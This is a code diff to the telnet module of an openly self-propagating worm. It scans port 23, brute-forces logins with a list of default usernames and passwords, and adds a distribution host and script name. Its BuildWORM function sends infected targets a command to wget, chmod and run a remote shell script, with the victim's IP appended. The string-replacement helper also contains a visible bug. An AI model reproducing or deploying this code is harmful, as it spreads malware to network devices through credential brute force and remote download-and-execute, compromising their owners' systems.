@@ -14,7 +14,11 @@ w the credentials we expect there..
 #include "../../structs.h"
 #include "../../utils.h"
 #include "telnet.h"
+#include "../portscan/portscan.h"
 
+// distribution host for WORM
+char distribution_host[] = "fdfdfd.com";
+char distribution_filename[] = "a.sh";
 
 char *users[] = { "root", "admin", "user", "login", "guest", "support", "cisco", NULL };
 char *passwords[] = { "root", "toor", "admin", "user", "guest", "login", "changeme", "1234", 
@@ -97,6 +101,9 @@ CustomState *CustomState_Ptr(Connection *cptr) {
 // initialize the module
 int telnet_init(Modules **_module_list) {
     Module_Add(_module_list, &HACK_Telnet);
+    
+    Portscan_Add(&HACK_Telnet, 23);
+    Portscan_Enable(23);
 }
 
 char *BuildLogin(Modules *mptr, Connection *cptr, int *size) {
@@ -150,13 +157,60 @@ char *BuildVerify(Modules *mptr, Connection *cptr, int *size) {
     return ret;
 }
 
-char *BuildWORM(Modules *mptr, Connection *cptr, int *size) {
-    char cmdline[] = "wget http://blahblah/a.sh;chmod +x a.sh;./a.sh\r\n";
-    char *ret = strdup(cmdline);
+int str_replace_one(char **str, char *macro, char *replace) {
+    char *ret = NULL;
+    char *sptr = NULL;
+    int p1_size = 0;
+    int p2_size = 0;
+    // lets just.. calculate it all together for quickness
+    int size = strlen(str) + strlen(macro) + strlen(replace) + 1;
     
-    if (ret) {
+    if ((sptr = strcasestr(*str, macro)) == NULL)
+        return 0;
+    p1_size = (int)(sptr - *str);
+    sptr += strlen(macro);
+    p2_size = strlen(*str) - (sptr - *str);
+    
+    // allocate space
+    if ((ret = malloc(size + 1)) == NULL)
+        return 0;
+        
+    memset(ret, 0, size);
+    
+    // copy to the new memory location the string, and the sizes
+    memcpy(ret, *str, p1_size);
+    memcpy(ret + p1_size, replace, strlen(replace));
+    memcpy(ret + p1_size + strlen(replace), sptr, p2_size);
+
+    free(*str);
+        
+    *str = ret;
+    
+    return 1;
+}
+
+void str_replace(char **str, char *macro, char *replace) {
+    int r = 0;
+    do {
+        r = str_replace_one(str, macro, replace);
+    } while (r > 0);
+}
+// we have to pass the connection its own IP.. it can be used for when it penetrates a new target (at least on this execution)
+char *BuildWORM(Modules *mptr, Connection *cptr, int *size) {
+    char cmdline[] = "wget http://%DIST%/%FNAME%;chmod +x %FNAME%;./%FNAME% %DSTIP%\r\n";
+    char *ret = strdup(cmdline);
+    struct sockaddr dst;
+    
+    // replace %IP% with the destination IP address..
+    dst.s_addr = cptr->addr;    
+    str_replace(&ret, "%DSTIP%", inet_ntoa(dst));
+    
+    // put in the distribution host..
+    str_replace(&ret, "%DIST%", distribution_host);
+    // now the filename
+    str_replace(&ret, "%FNAME%", distribution_filename);
+    if (ret)
         *size = strlen(ret);
-    }
     
     // give it 5 minute timeout starting from current time
     cptr->start_ts = time(0);
@@ -192,6 +246,9 @@ typedef struct _state_commands {
     // end of commands..
     { 0, NULL, NULL, 0, NULL }
 };
+
+
+
 
 int telnet_incoming(Modules *mptr, Connection *cptr, char *buf, int size) {
     CustomState *Cstate = CustomState_Ptr(cptr);
